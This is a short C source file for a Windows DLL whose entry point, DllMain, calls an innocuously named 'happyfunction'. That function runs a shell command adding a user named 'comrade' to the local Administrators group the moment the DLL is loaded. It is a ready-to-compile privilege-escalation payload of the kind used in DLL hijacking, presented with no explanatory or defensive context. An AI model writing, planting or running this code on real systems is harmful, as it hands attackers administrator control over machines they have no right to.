#include <windows.h> 
int happyfunction()
{
 WinExec("cmd /C net localgroup administrators comrade /add", 1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 happyfunction();
 return 0;
}
